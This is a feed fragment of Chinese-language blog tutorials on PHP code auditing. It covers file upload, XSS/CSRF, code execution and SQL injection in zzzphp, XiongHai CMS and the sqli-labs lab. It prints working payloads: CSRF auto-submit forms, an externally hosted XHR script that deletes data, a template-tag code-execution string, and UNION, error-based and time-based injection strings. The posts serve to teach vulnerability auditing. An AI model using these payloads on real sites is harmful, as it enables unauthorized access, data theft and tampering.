href="#0x03-文件上传" class="headerlink" title="0x03 文件上传"></a>0x03 文件上传</h1><p>文件上传只有一个函数 <code>move_uploaded_file()</code> 一般来说，我们就可以搜索这个函数来回溯，看他的验证方式，是黑名单还是白名单，是否是前端限制，是否只是简单的验证了文件头，是否是能绕过的正则匹配，是否渲染了图片。</p><p>结合zzzphp来审计一下文件上传，全局搜索<code>move_uploaded_file</code></p><p>\zzzcms\inc\zzz_file.php</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.14.png" alt="1.5.14"></p><p>回溯看看那里调用了这个函数</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.15.png" alt="1.5.15"></p><p>典型的黑名单验证，可以使用asa绕过，只需要在后台添加这个扩展名</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.16.png" alt="1.5.16"></p><p>上传即可，当然也可以通过上图中的 switch分支，只要传入的 type不是他的类型就可以跳过后台添加这个步骤，</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.17.png" alt="1.5.17"></p><h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 文末</h1><p>对文件的操作还见于写入其他配置文件，典型的有thinkphp缓存文件写入。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-文件包含&quot;&gt;&lt;a href=&quot;#0x00-文件包含&quot; class=&quot;headerlink&quot; title=&quot;0x00 文件包含&quot;&gt;&lt;/a&gt;0x00 文件包含&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://wq371680537.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>1.4.XSS与CSRF审计</title>
    <link href="https://wq371680537.github.io/2019/09/28/1-4-XSS%E4%B8%8ECSRF%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wq371680537.github.io/2019/09/28/1-4-XSS与CSRF审计/</id>
    <published>2019-09-28T02:16:32.000Z</published>
    <updated>2019-09-28T03:00:46.555Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-XSS简介"><a href="#0x00-XSS简介" class="headerlink" title="0x00 XSS简介"></a>0x00 XSS简介</h1><a id="more"></a><p>XSS分为反射型和储存型，一般来说反射型的用处不是很大利用难度相对较高，存储型XSS一般常见于发布评论、留言、收获地址、个人信息等等。对于xss的审计我们一般就在这些点找，有用户控制输入信息输出的地方都是它出现的地方，很多网站的突破口可能就是一个XSS。</p><h1 id="0x01-XSS实战审计"><a href="#0x01-XSS实战审计" class="headerlink" title="0x01 XSS实战审计"></a>0x01 XSS实战审计</h1><p>这次选用的CMS还是熊海，我们通过搭建环境查看输入的地方来审计，学习下高效率审计方式。</p><p><img src="/2019/09/28/1-4-XSS与CSRF审计/1.4.1.png" alt="1.4.1"></p><p>随意留言抓包看看他请求的url再去找相对的文件<code>/?r=submit&amp;type=message</code> 当然你还是得看看他是怎么调用文件的，这里就是加载submit文件中的message方法。</p><p>我们来到 files/submit.php</p><p><img src="/2019/09/28/1-4-XSS与CSRF审计/1.4.2.png" alt="1.4.2"></p><p>前面的输入基本都没过过滤，到了最后一步<code>$content</code>被 <code>addslashes(strip_tags($content));</code>过滤，所以我们XSS其他地方即可，看到这里我们在挖洞的过程中所以不要纠结一点。</p><p><img src="/2019/09/28/1-4-XSS与CSRF审计/1.4.3.png" alt="1.4.3"></p><p>一般过滤xss的函数还有<code>htmlspecialchars</code>，我们审计他的注意点就是查看一些输出函数print、print_r、echo、printf、die、var_dump、var_export。</p><h1 id="0x02-Csrf"><a href="#0x02-Csrf" class="headerlink" title="0x02 Csrf"></a>0x02 Csrf</h1><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。<br>CSRF实际上就是利用你的身份去发送恶意请求，我们需要知道CSRF分为GET型提交的和POST，前者危害更大，后者一般可以寻找XSS来配合我们。GET型的比如一个链接 <a href="http://www.404.com/1.php?id=1" target="_blank" rel="noopener">http://www.404.com/1.php?id=1</a> 访问即可删除账号，然后你在论坛发帖构造<br><code>&lt;img src=&quot;http://www.404.com/1.php?id=1&quot;&gt;</code> 那么访问这个帖子的人账号都将会删除，POST的见下文，造成CSRF的原因就是没有使用token或者验证其他值，审计就看页面有没有token、referer验证，验证是否可以绕过，不过我推荐还是先黑盒，看看有没有token，删除了referer是否能够访问，再结合代码来看。</p><p>我们来看到zzzphp的后台，他是没有token的，同时我们前面审计到了他的代码执行，配合这个csrf就可以直接getshell。</p><p><img src="/2019/09/28/1-4-XSS与CSRF审计/1.4.4.png" alt="1.4.4"></p><p>如果你不会自己写这个代码，不妨使用burp生成一个测试页面，右键选择即可。</p><p><img src="/2019/09/28/1-4-XSS与CSRF审计/1.4.5.png" alt="1.4.5"></p><p>这是个需要点击的表单,你可以加一段JavaScript代码来自动提交。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="0x03-组合利用"><a href="#0x03-组合利用" class="headerlink" title="0x03 组合利用"></a>0x03 组合利用</h1><p>这里只是个简单的组合，由于没找到具体实验环境我只有简单的演示一下(懒)<br>本次选妃zzzphp，由于他后台没有的xss，我只能登陆后台后查看前台了。</p><p>1.构造CSRF表单自动提交<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">         //burp生成的表单</span><br><span class="line">      &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>2.插入iframe标签</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://404.com/zzzp6p/1.html&quot; /&gt;</span><br></pre></td></tr></table></figure><p>还可以使用XMLHTTPRequest发送POST、GET，按情况选择，这里把payload插入手机号码。</p><p><img src="/2019/09/28/1-4-XSS与CSRF审计/1.4.6.png" alt="1.4.6"></p><p>用登陆了后台后访问页面，可以看到显示修改成功。</p><p>由于没找到想要的源码我简单介绍下利用XMLHTTPRequest来发包,漏洞程序还是熊海cms删除一友情链接</p><p>payload 1.js：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function del() &#123;</span><br><span class="line">    var xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.open(&apos;GET&apos;,&apos;/xiong/admin/?r=linklist&amp;delete=6&apos;);</span><br><span class="line">    xhr.send(null);</span><br><span class="line">    &#125;</span><br><span class="line">del();</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://404.com/xiong/1.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>查看留言板可以看到我们的XMLHTTPRequest已经发包了</p><p><img src="/2019/09/28/1-4-XSS与CSRF审计/1.4.7.png" alt="1.4.7"></p><p>比较典型的例子可以看看 <a href="https://xz.aliyun.com/t/3177" target="_blank" rel="noopener">https://xz.aliyun.com/t/3177</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-XSS简介&quot;&gt;&lt;a href=&quot;#0x00-XSS简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 XSS简介&quot;&gt;&lt;/a&gt;0x00 XSS简介&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://wq371680537.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>1.3.代码执行审计</title>
    <link href="https://wq371680537.github.io/2019/09/28/1-3-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wq371680537.github.io/2019/09/28/1-3-代码执行审计/</id>
    <published>2019-09-28T02:16:16.000Z</published>
    <updated>2019-09-28T03:00:53.564Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><a id="more"></a><p>代码执行也是我们经常遇到的，通常是<code>eval()</code>、<code>assert()</code>，当然还有回调函数比如<code>call_user_func()</code> <code>array_map()</code>，正则函数，动态调用等等，因为程序对传入的参数过滤不严或者没有过滤，导致代码执行，看过我前面写的php的webshell总结的话，你就会发现很多知识是相辅相成的。</p><h1 id="0x01-代码执行"><a href="#0x01-代码执行" class="headerlink" title="0x01 代码执行"></a>0x01 代码执行</h1><p>这里说说eval的命令执行，assert在php7后面移除了。我们来看一个简单的eval代码执行</p><p>test.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$id = $_GET[&apos;x&apos;];</span><br><span class="line">eval($id);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?x=phpinfo();</span><br></pre></td></tr></table></figure><p>简单到waf以为他是个webshell了，当然我们实际情况肯定遇不到这么简单的，可能需要多重组合利用，这里下面我以一个实例为例</p><h1 id="0x02-实战审计"><a href="#0x02-实战审计" class="headerlink" title="0x02 实战审计"></a>0x02 实战审计</h1><p>这里使用的是zzzphp V1.6.0的一个解析标签过程中引发的代码执行，网上也有其他人的审计思路，这里我是帮朋友复现的时候弄的。</p><p>找个的审计思路是全局搜索eval，当然你也可以搜索其他的能够引发代码执行的函数，但是这个这-1里没有。</p><p>路径：\inc\zzz_template.php</p><p><img src="/2019/09/28/1-3-代码执行审计/1.3.1.png" alt="1.3.1"></p><p>我们发现eval里面有变量，那么他是可能存在代码执行的</p><p><img src="/2019/09/28/1-3-代码执行审计/1.3.2.png" alt="1.3.2"></p><p>大概看了下<code>parserIfLabel()</code> 函数没有什么过滤，能够达到我们传入任意参数的目的，到了这里我们就是回溯那里调用了这个函数呗，全局搜索下<code>parserIfLabel()</code>，没搜索到，看了下是个类，所以搜索类名<code>ParserTemplate</code>。</p><p><img src="/2019/09/28/1-3-代码执行审计/1.3.3.png" alt="1.3.3"></p><p>既然 \admin\save.php 调用了我们这个，不妨看看后台那里有模板操作这个</p><p><img src="/2019/09/28/1-3-代码执行审计/1.3.4.png" alt="1.3.4"></p><p>当然完全你也可以回溯代码去分析，但是既然有源码能看就看。</p><p><img src="/2019/09/28/1-3-代码执行审计/1.3.4.png" alt="1.3.4"></p><p>随便找个文件放入我们遵循他正则的代码即可，不过一般我们测试的过程中，尽量选择对目标影响小的文件。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:assert(phpinfo())&#125;x&#123;end if&#125;</span><br></pre></td></tr></table></figure><p>于此同类的还有苹果cms8.x，都是在解析标签过程中出现的问题，一般看到可以自定义解析标签那么就值得注意，命令执行与此类似，这里就不说了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>1.2.SQL注入审计</title>
    <link href="https://wq371680537.github.io/2019/09/28/1-2-SQL%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wq371680537.github.io/2019/09/28/1-2-SQL注入审计/</id>
    <published>2019-09-28T02:01:53.000Z</published>
    <updated>2019-09-28T03:01:00.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><a id="more"></a><p>为什么第一章我们学习，因为看这篇文章的朋友大概也看过我前面写的MySQL_wiki系列，这里来SQL注入的话我们能方便理解，同时sql注入也是审计中我们经常想要找到的，比较以来就getshell什么的也不现实这种漏洞也不多。</p><h1 id="0x01-字符型注入"><a href="#0x01-字符型注入" class="headerlink" title="0x01 字符型注入"></a>0x01 字符型注入</h1><p>这里我们看到sqli-libs第一关的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">// connectivity </span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们可以看到调用<code>$_GET[&#39;id&#39;]</code>获取参数内容，没有经过任何过来带入了SQL语句的查询，也就是代码没有任何过来且没开魔术引号，那么将会形成注入，如果开启魔术引号遇到数字型的我们还是能够注入的，因为<code>magic_quotes_gpc</code>只会转义单引号、双引号、反斜线、NULL，但是数字型注入我们可以不试用到这些。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=-1%27union%20select%201,user(),3--%20+</span><br></pre></td></tr></table></figure><h1 id="0x02-编码类注入"><a href="#0x02-编码类注入" class="headerlink" title="0x02 编码类注入"></a>0x02 编码类注入</h1><p>有些为了业务需要他会把传入一些编码后的参数再解码带入数据库查询，我们常见的有base64编码，也有的程序会内置url解码，这类写法通常见于框架。</p><p>1.base64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">$id=base64_decode($_GET[&apos;id&apos;]);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"> </span><br><span class="line">if ($row) &#123;</span><br><span class="line">    echo &quot;id:&quot;.$row[&apos;id&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;用户名:&quot;.$row[&apos;username&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;密码:&quot;.$row[&apos;password&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">echo &quot;查询的语句是：$sql&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传入的值base64解密后带入查询，这种注入魔术引号是没办法拦截的，当我们遇到网站为base64编码的参数时可以留意下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/base64.php?id=JyB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyAtLSAr</span><br></pre></td></tr></table></figure><p>2.urldecode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">$id=urldecode($_GET[&apos;id&apos;]);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"> </span><br><span class="line">if ($row) &#123;</span><br><span class="line">    echo &quot;id:&quot;.$row[&apos;id&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;用户名:&quot;.$row[&apos;username&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;密码:&quot;.$row[&apos;password&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">echo &quot;查询的语句是：$sql&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>因为接受的参数只会被url解码一次，传入的值不是魔术引号认识的值所以可以绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/base64.php?id=%2527union%20select%201,user(),3--%20+</span><br></pre></td></tr></table></figure><h1 id="0x03-宽字节注入"><a href="#0x03-宽字节注入" class="headerlink" title="0x03 宽字节注入"></a>0x03 宽字节注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;);</span><br><span class="line">mysql_select_db(&quot;security&quot;,$conn);</span><br><span class="line">mysql_query(&quot;set names &apos;gbk&apos; &quot;,$conn);</span><br><span class="line">$id=urldecode($_GET[&apos;id&apos;]);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"> </span><br><span class="line">if ($row) &#123;</span><br><span class="line">    echo &quot;id:&quot;.$row[&apos;id&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;用户名:&quot;.$row[&apos;username&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;密码:&quot;.$row[&apos;password&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">echo &quot;查询的语句是：$sql&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>网上有很多解释大家可以搜索一下我这里就不详细介绍了大概原因就是:</p><p>id=1’-&gt;id=1\’-&gt;id=1%5c%27</p><p>id=1%df’-&gt;id=1%df%5c%27-&gt;id=1%DF5C%27-&gt;id=1運’</p><p>当然还有其他各种类型的注入这里就不一一列举了，看了mysql系列文章的大概都知道，不知道的可以看看。</p><h1 id="0x04-过滤"><a href="#0x04-过滤" class="headerlink" title="0x04 过滤"></a>0x04 过滤</h1><p>通常情况下一个成熟的cms是不存在不过滤的情况，一般的程序选择用函数来过滤比如<code>addslashes()</code>，也可以开启魔术引号，但是更多的程序它采用正则匹配来过滤，<br>使用不正确的匹配替换方式反而导致被绕过的机会更大，比如有的程序把<code>union</code> 替换为空，那么我们就可以双写<code>ununionion</code>绕过从而还可能绕过外部WAF,对于整数型一般采用<code>intval()</code>等字符转换，后期通过实战一步一步讲解。</p><h1 id="0x05-实战审计"><a href="#0x05-实战审计" class="headerlink" title="0x05 实战审计"></a>0x05 实战审计</h1><p>找了半天源码，还是用这款熊海CMS V1.0吧，这款CMS感觉不错，什么洞都有，非常适合我们学习审计，同时审计这个cms的文章很多，大家如果觉得我写的不如人意，还能看看别人。</p><p>首先我们审计对传入的参数如果想快速的看是否有全局过滤，不妨找个文件输出一下<code>$_POST</code>、<code>$_GET</code>等等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $_POST[&apos;b&apos;];</span><br><span class="line">echo $_GET[&apos;a&apos;];</span><br></pre></td></tr></table></figure><p><img src="/2019/09/28/1-2-SQL注入审计/1.2.1.png" alt="1.2.1"></p><p>没有全局过滤 我们来到后台登陆文件admin/files/login.php 看看login.php一般登陆存在注入的可能性还是很大的</p><p><img src="/2019/09/28/1-2-SQL注入审计/1.2.2.png" alt="1.2.2"></p><p>很明显 带入查询的user没有经过任何过滤，同时输出了错误，所以可以用报错查询，当然你也选择万能密码。</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=1111&apos; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- +&amp;password=111&amp;login=yes</span><br></pre></td></tr></table></figure><p><img src="/2019/09/28/1-2-SQL注入审计/1.2.3.png" alt="1.2.3"></p><p>在看看留言板 files/submit.php </p><p><img src="/2019/09/28/1-2-SQL注入审计/1.2.4.png" alt="1.2.4"></p><p>传入参数没有过滤</p><p><img src="/2019/09/28/1-2-SQL注入审计/1.2.5.png" alt="1.2.5"></p><p>同时插入的时候，这里使用了<code>mysql_error()</code>所以可以用报错注入，否则只能使用盲注了。</p><p><img src="/2019/09/28/1-2-SQL注入审计/1.2.6.png" alt="1.2.6"></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cid=0&amp;name=&apos;or updatexml(1,concat(0x7e,(version())),0) or&apos;&amp;mail=1111&amp;url=http%3A%2F%2F1&amp;content=%E9%98%BF%E5%BE%B7&amp;save=%E6%8F%90%E4%BA%A4&amp;randcode=&amp;jz=1&amp;tz=1</span><br></pre></td></tr></table></figure><p>开始我们说过不是使用了过滤函数就万事大吉了，数字型注入可以不使用引号</p><p><img src="/2019/09/28/1-2-SQL注入审计/1.2.7.png" alt="1.2.7"></p><p>我们看到传入的<code>cid</code>已经被<code>addslashes()</code>函数转义了，查询的地方都没啥问题，但是到浏览计数的时候调用了它，那么我们就可以使用盲注或者报错注入了，因为有错误回显。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xhcms/?r=content&amp;cid=1%20and%20If(ascii(substr(database(),1,1))%3C10,0,sleep(10))</span><br></pre></td></tr></table></figure><p>这个系统还有其他注入，想练手的自己下载审计一下，总体思路有用户交互的地方都有可能存在注入，这也是我们没有通读代码的一个审计思路。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://wq371680537.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>1.1.初识代码审计</title>
    <link href="https://wq371680537.github.io/2019/09/28/1-1-%E5%88%9D%E8%AF%86%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wq371680537.github.io/2019/09/28/1-1-初识代码审计/</id>
    <published>2019-09-28T02:00:52.000Z</published>
    <updated>2019-09-28T03:01:14.538Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><a id="more"></a><p>终于来到了代码审计篇章。希望看了朋友有所收获，我们通常把代码审计分为黑盒和白盒，我们一般结合起来用。</p><p>通常我们白盒审计有多种方法我们可以归纳为：</p><p>1.通读全文</p><p>2.回溯</p><p>其中通读全文费时间，但是有利于代码审计的经验积累，也能更深入的挖掘一些难以发现的漏洞。功能回溯我们可以定向的审计一些功能和函数，最常见的就是对命令执行函数的回溯，和上传等功能的审计。通过熟悉白盒审计有利于漏洞的发掘，因为代码审计和开发都能熟悉到程序中那些地方会存在对数据库的操作和功能函数的调用，举个简单的例子当我们看到download的时候，我们就会想到是不是有任意文件下载。</p><h1 id="0x01-环境与工具"><a href="#0x01-环境与工具" class="headerlink" title="0x01 环境与工具"></a>0x01 环境与工具</h1><p>我们在代码审计中又可以分为静态和动态，静态我们通常用于无法搭建原来的环境只能看代码逻辑来判断是否存在漏洞，而动态调试就可以debug、输出、监控SQL语句来看非常方便。</p><p>接下来代码审计工具基本就用到Sublime Text 3、VSCode、Seay源代码审计系统、PHPStorm+XDebug、文件对比、MYSQL监控、编码转换、正则调试等。其中文件对比工具可以拿来和更新补丁后的文件进行对于对比定位漏洞代码区，PHPStorm+XDebug可以动态调试定位漏洞成因,也有利于漏洞的发掘。当然你也可以用那些自动化审计的，貌似还支持代码回溯，还是能审计到一些漏洞的。环境能用基本就用phpstudy了。</p><h1 id="0x02-知识准备"><a href="#0x02-知识准备" class="headerlink" title="0x02 知识准备"></a>0x02 知识准备</h1><p>代码审计我们需要对php有一定的了解，当然是越深入越好，我们也不纠结，代码审计需不需要精通php什么的，只能说知识面在什么层次就能审计到什么层次的漏洞，但是至少你得看得懂代码。</p><p>我们应该具备一些知识：</p><p>1.基本的正则</p><p>2.数据库的一些语法(这个我在前面的数据库维基已经讲的差不多了)</p><p>3.至少你得看懂php代码</p><p>4.php配置文件以及常见函数</p><h1 id="0x03-关于文章的一些问题"><a href="#0x03-关于文章的一些问题" class="headerlink" title="0x03 关于文章的一些问题"></a>0x03 关于文章的一些问题</h1><p>前面我们的实验环境我基本上不会使用框架类的，我尽量使用一些很普通的网站，还有如何用phpstudy之类的来本地搭建网站这些我也不会讲，这些基础的问题搜索一下就有，不能独立解决问题怎么能进步，遇到一些特殊的问题我还是会说一下的。</p><h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 文末</h1><p>当然如果你跟我一样是一个新手才入门代码审计，看这篇文章最好不过了，因为我会讲的很细,当然我可能很多东西也讲不到，还请大家多看看别人的审计思路，只有不断的学习才有提高。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h1&gt;
    
    </summary>
    
    
